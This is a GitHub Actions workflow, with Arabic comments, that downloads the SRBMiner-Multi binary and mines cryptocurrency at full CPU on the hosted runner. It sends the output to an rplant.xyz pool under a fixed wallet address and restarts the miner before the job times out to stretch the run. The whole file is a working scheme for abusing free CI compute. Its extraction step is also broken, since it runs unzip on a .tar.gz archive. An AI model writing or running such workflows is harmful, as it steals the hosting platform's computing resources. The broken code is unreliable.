name: Linux-Miner-Max

on:
  workflow_dispatch:

jobs:
  miner:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 ساعات

    steps:
      - name: Install dependencies
        run: |
          sudo apt update
          sudo apt install -y wget unzip

      - name: Download SRBMiner 3.0.3 (Linux)
        run: |
          wget -O miner.zip "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-Linux.tar.gz"
          unzip miner.zip -d miner

      - name: Start SRBMiner (yespoweradvc) Max CPU
        run: |
          cd miner
          folder=$(ls -d SRBMiner* | head -n 1)
          exe="$folder/SRBMiner-MULTI"
          chmod +x "$exe"
          threads=$(nproc)
          echo "➡ تشغيل SRBMiner بأقصى عدد من الأنوية: $threads"
          nohup "$exe" -a yespoweradvc -o stratum+tcps://eu.rplant.xyz:17149 -u Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E -p x --cpu-threads $threads > miner.log 2>&1 &

      - name: Full Restart Before Timeout
        run: |
          # الانتظار 5 ساعات و40 دقيقة = 340 دقيقة
          wait_minutes=340
          echo "⏱ الانتظار $wait_minutes دقيقة قبل إعادة تشغيل كامل للminer"
          sleep $((wait_minutes * 60))

          # قتل أي عمليات SRBMiner تعمل
          echo "⛔ إيقاف العمليات الحالية للminer..."
          pkill -f SRBMiner-MULTI || true
          sleep 5

          # إعادة تشغيل miner كامل بأقصى قدرة
          cd miner
          folder=$(ls -d SRBMiner* | head -n 1)
          exe="$folder/SRBMiner-MULTI"
          chmod +x "$exe"
          threads=$(nproc)
          echo "🔄 إعادة تشغيل SRBMiner بالكامل بأقصى قدراته"
          nohup "$exe" -a yespoweradvc -o stratum+tcps://eu.rplant.xyz:17149 -u Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E -p x --cpu-threads $threads > miner.log 2>&1 &

          # انتظار حتى نهاية workflow (~20 دقيقة)
          remaining_minutes=20
          echo "⏱ انتظار $remaining_minutes دقيقة إضافية حتى نهاية workflow"
          sleep $((remaining_minutes * 60))
          echo "✅ انتهت مدة workflow"
